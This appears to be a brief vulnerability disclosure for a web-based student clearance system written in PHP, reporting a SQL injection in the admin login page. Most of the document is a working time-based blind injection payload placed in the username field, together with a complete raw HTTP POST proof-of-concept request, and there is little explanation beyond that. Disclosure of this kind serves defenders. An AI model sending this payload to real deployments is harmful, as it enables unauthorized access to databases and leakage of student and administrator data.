# Vulnerability Description

The Web-based Student Clearance System in PHP Free Source Code  (It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author: Tr0e

2. vendors: [Web-Based Student Clearance System in PHP Free Source Code](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html);

3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;

4. Vulnerability location:  /student_clearance_system_Aurthur_Javis/admin/login.php

# Vulnerability Verification

[+] Payload:

```java
txtusername=admin'and(select*from(select+sleep(3))a/**/union/**/select+1)='&txtpassword=admin123&btnlogin=
```

POC：

```js
POST /student_clearance_system_Aurthur_Javis/admin/login.php HTTP/1.1
Host: 192.168.0.111:91
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111:91
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111:91/student/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=e8pdd3dv0b39d1h4vcj99q01cq
Connection: close

txtusername=admin'and(select*from(select+sleep(3))a/**/union/**/select+1)='&txtpassword=admin123&btnlogin=
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：

![](C:\Users\True\AppData\Roaming\marktext\images\2022-10-06-21-42-58-image.png)
